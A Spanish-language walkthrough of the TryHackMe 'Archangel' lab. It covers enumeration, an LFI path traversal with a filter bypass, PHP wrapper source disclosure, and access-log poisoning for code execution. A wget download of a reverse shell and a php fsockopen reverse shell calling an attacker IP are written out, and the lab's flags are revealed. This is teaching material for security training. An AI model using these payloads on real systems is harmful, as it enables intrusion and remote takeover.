# Archangel
Máquina resuelta de *TryHackMe* en la que se trabaja la enumeración y *fingerprinting*, *reverse shell* y la escucha de puertos, XXXXXXXX y la escalada de privilegios.
<div>
  <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/-Nmap-6933FF?style=for-the-badge&logo=nmap&logoColor=white" />
  <img src="https://img.shields.io/badge/-Dirsearch-005571?style=for-the-badge&logo=dirsearch&logoColor=white" />
  burp suite
  <img src="https://img.shields.io/badge/-php-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img src="https://img.shields.io/badge/-Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white" />
  <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
</div>

## Objetivo

Explicar la realización del siguiente _Capture the flag_ perteneciente a la plataforma *TryHackMe*. Este desafío, nos situa en una tesitura donde una conocida empresa de soluciones de seguridad parece estar realizando pruebas en su equipo. Para completar este reto, se deberá trabajar con el *Virtual hosting* de un dominio e interactuar con este, mediante LFI, para acceder a la máquina y realizar una escalada de privilegios.

## Que hemos aprendido?

- Realizar *fingerprinting* y enumeración de puertos y enumeración web.
- Funcionamiento *Virtual hosting*.
- Explotación de vulnerabilidades LFI (*Local File Inclusion*).
- Ejecución de RCE (*Remote Code Execution*).
- Realizar un *Path Traversal*.
- Funcionamiento de *Burp Suite*.
- Utilización de *wrappers* de *php*.
- Realizar una *reverse shell*.
- Poner en escucha los puertos de la máquina.
- Obtener una *shell* a partir de un *script*.
- Crear un servidor con *python3*.
- Utilizar variables de entorno.
- Escalada de privilegios.

## Herramientas utilizadas

- *Kali Linux*.
- Enumeración: *Nmap*, *Dirsearch*.
- Penetración: *Burp Suite*, *Bash*, *PHP*, *Netcat*, *Python3*, . 

## Steps

### Enumeración y fingerprinting

La máquina a vulnerar pertenece a la plataforma *TryHackMe*, la propia web te proporciona la IP de la máquina víctima. La conexión a esta se hace mediante una VPN que te proporciona THM y asigna una nueva IP para que tu máquina interactúe con la máquina vulnerable.

El primer paso es lanzar **Nmap** sin *ping* (-Pn) y con los *scripts* por *default* de la herramienta (-sC) para que encuentre vulnerabilidades. Además, se quieren conocer las versiones que corren en cada puerto (-sV) y el sistema operativo (-O). No se indica, específicamente, que compruebe todos los puertos pues en este tipo de máquina no será necesario.

<code>nmap -Pn -sV -O -sC 10.10.215.160</code>

![Captura de pantalla 2025-04-22 164433](https://github.com/user-attachments/assets/d0f3a43b-f403-4342-9595-011ed8b1f77f)

El comando devuelve 2 puertos TCPs abiertos:  
- En el puerto 22 corre la versión *Openssh 7.6p1*, en un sistema *Ubuntu*, servicio *SSH*.  
- En el puerto 80 corre el servidor *Apache 2.4.29*, en un sistema *Ubuntu*, servicio *HTTP*.

Primero nos dirigimos, desde el navegador, al puerto 80 de la IP dada, donde se puede ver la página web de la empresa de soluciones de seguridad. El reto de THM pide encontrar el nombre de *host*, el cual se puede deducir al encontrar un correo en la página web con el dominio 'mafialive.thm'. Esto nos lleva a pensar que se está utilizndo un *Virtual hosting* donde distitos dominios comparten la misma dirección IP con el objetivo de ahorrar en costes y usar los recursos de manera más efectiva.

![Captura de pantalla 2025-04-22 164207](https://github.com/user-attachments/assets/64c88ee4-d635-4ef7-95d7-a82ac57c0ff5)

Una vez encontrado el dominio, se asignará este a la dirección IP 10.10.215.160, al final del archivo '/etc/hosts'. Poniendo ahora en el navegador 'mafialive.thm', se encuentra la primera de las *flags*.

**Flag: thm{f0und_th3_r1ght_h0st_n4m3}**

Seguidamente, con la ayuda de la herramienta **Dirsearch**, se hace una enumeración de posibles directorios y archivos que se encuentren en la web. Por la parte de archivos, aparecen dos que son alcanzables 'test.php' y el clásico 'robots.txt'. *Dirsearch* es lanzado con **Python3** indicando el dominio 'mafialive.thm (-u) y la lista a utilizar para la enumeración (-w); en este caso la *seclist* '/raft-small-files.txt'.

<code>python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u mafialive.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt</code>

![Captura de pantalla 2025-04-22 172710](https://github.com/user-attachments/assets/f7530f66-7e9a-42e0-abde-57d1f5ef9e7b)

El archivo 'robots.txt' indica a los rastreadores web de motores de búsqueda, a que páginas pueden acceder. En este caso se indica que no se peude acceder al archivo 'test.php' y está instrucción es para todos los motores de búsqueda. Si nos dirigimos a esta pagina se muestra que está en desarrollo y aparece un botón con el que interactuar.

![image](https://github.com/user-attachments/assets/687d71d4-dab8-4b87-b910-480669239780)


### Vulnerabilidades explotadas

Al hacer click en el botón, se muestra el mensaje ‘Control is an ilusion’. Si capturamos la petición mediante **Burp Suite**, vemos como mediante el método GET se lee el archivo ‘mrrobot.php’ utilizando el parámetro *view*.

![image](https://github.com/user-attachments/assets/20a78635-aa86-400c-9f95-7d38e64b76a3)

Jugando con este parámetro se puede aprovechar una vulnerabilidad *Local File Inclusion* (LFI) para leer archivos locales, nos aprovechamos de la posibilidad de usar la *URL* como *input*. Mediante un *Path traversal* se intenta llegar hasta el archivo ‘/etc/passwd’, pero para conseguirlo se debe saltar un filtro a ‘../..’ con ‘..//..’. El ataque es positivo y se descubre el usuario 1001 llamado ‘archangel’.

<code>GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/passwd HTTP/1.1</code>

![image](https://github.com/user-attachments/assets/876549b7-8b52-4f79-83cf-f69b98f78a46)

El siguiente paso es hacer uso de los *wrappers* de *php* que facilitan el uso de ciertos elementos de código originalmente escritos en un lenguaje, en este caso en el mismo *php*. Para esta coyuntura se hace uso del ‘*filter*’, en concreto se utiliza el convertidor en base64 sobre el archivo ‘test.php’ (página que muestra el botón a clicar). Con esto se pretende conseguir el código de esta web en base64, de tal manera que se muestre el código del *backend* (*php*) que se ejecuta en el lado del servidor y no sólo el código *html* que es ejecutado en el lado del cliente. Dicho también de otra manera, nos permite leer el código *php* en lugar de que el navegador simplemente lo ejecute. Este *wrapper* ha sido sacado de la página [hacktricks]( https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion).

<code>GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1</code>

![image](https://github.com/user-attachments/assets/25d343d1-44ba-45ff-a31e-c9c742826131)

Desde el terminal de *Linux* se decodifica el código devuelto con la siguiente instrucción.

<code>echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d</code>

![Captura de pantalla 2025-04-24 125131](https://github.com/user-attachments/assets/e69da747-f603-4432-8d26-6e2dd070fdf9)

El código *php* devuelto confirma el filtro que se aplicaba para evitar el *path traversal*, junto con el control de que cualquier archivo que se pretendiera mostrar, estuviera dentro de la ruta '/var/www/html/development_testing'. Además, el código contiene un comentario con una nueva *flag*.

**Flag: thm{explo1t1ng_lf1}**

Para no ir enumerando archivo por archivo de manera manual como se ha hecho con ‘/etc/passwd’, *BurpSuite* tiene una opción llamada *Intruder*, por medio la cual, se puede pasar una lista (lfi-interesting_files-linux.txt) preparada con archivos de sistema interesantes y que sean comprobados automáticamente. Gracias a esto se descubre el archivo ‘/var/log/apache2/acces.log’, donde se almacena información sobre las peticiones entrantes.

![Captura de pantalla 2025-04-24 155849](https://github.com/user-attachments/assets/df9d794f-630e-470f-9be5-cf3cd2e20442)

Así pues, con la ayuda del *wrapper* 'php://input', se pueden meter comandos en el campo *User-Agent* mediante la función de ejecución de programa *system(**comando**)* de *PHP*. De manera que la dirección web ‘/var/log/apache2/acces.log’ lo interprete y ejecute. Como prueba, se listan los archivos que contenga el directorio '/var/www/html/development_testing/' y para ver con más claridad el *log* se puede ver la vista del código fuente, donde efectivamente se muestran los diferentes archivos.

<code>GET /test.php?view=php://input HTTP/1.1  
Host: mafialive.thm  
User-Agent: Mozilla/5.0 < ?php system('ls -la'); ? > Gecko/20100101 Firefox/136.0</code>

![Captura de pantalla 2025-04-24 161350](https://github.com/user-attachments/assets/cd1b236b-f0b6-4b8f-a07f-d9cdce43cf72)

Puesto que ir haciendo esto para cada comando que se quiera lanzar es un engorro, se subirá un archivo con una *reverse shell* a este directorio para después ejecutarlo desde este y tener acceso a la máquina. La *reverse shell* es descargada de la página de *Github* de [pentestmonkeys](https://github.com/pentestmonkey/php-reverse-shell) y se debe adecuar a la IP y puerto de la máquina atacante que escucha. Sólo es necesario modificar las variables $ip (10.23.92.113) y $port (1234). Por un lado se crea un servidor con **Python3** como se ha hecho en otros CTF desde la carpeta donde se almacena el archivo con la *reverse*.

<code>python3 -m http.server 8000</code>

Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra de la *URL* se pueda indicar el comando a lanzar <code>system($_GET['cmd'])</code>. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente. Con <code>wget</code> se procederá a descargar el archivo 'php-reverse-shell.php' indicando la IP de la máquina atacante y el puerto donde se encuetra el servidor creado (8000). De esta manera el 'acces_log' ejecutará la descarga en la carpeta '/development_testing'. La dirección introducida es la siguiente:

<code>http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//../%2fvar%2flog%2fapache2%2faccess.log&cmd=wget%20http://10.23.92.113:8000/php-reverse-shell.php</code>

Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha, en nuestra máquina, el puerto '1234' con la herramienta **Netcat**.

<code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/php-reverse-shell.php</code>

<code>nc -lvnp 1234</code>

![Captura de pantalla 2025-04-25 135922](https://github.com/user-attachments/assets/d1328e57-dad6-48a6-bfe9-6b19c5fee614)

Una vez realizado este *remote control execution* y obtenido el acceso (como usuario www-data), recupero un directorio que había observado anteriormente con *Burp Suite, que no es otro que '/etc/crontab'.

<code>GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/crontab HTTP/1.1</code>

Este directorio mostraba un *script* llamado 'helloworld.sh' que es ejecutado cada minuto por el usuario Archangel. Se comprueba que desde el usuario actual se puede modificar el contenido de este programa para ejecutar una nueva *reverse shell* que nos permita pivotar al usuario Archangel. Puesto que ya se ha comprobado que en la máquina se encuentra la herramienta de *php*, se utiliza esta para obtener el acceso al nuevo usuario con la ayuda de [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). De esta manera, se cambia el contenido de 'helloworld.sh' por lo siguiente. Además de volver a poner en escucha un puerto en la máquina anfitriona.

<code>#!/bin/bash</code>

<code>php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>

![Captura de pantalla 2025-04-25 142151](https://github.com/user-attachments/assets/1c513e0d-7415-4c90-9ba3-88b8c725925f)

Una vez obtenida la *shell* de Archangel, se encuentra la siguiente *flag* en el archivo /home/archangel/user.txt

**Flag: thm{lf1_t0_rc3_1s_tr1cky}**
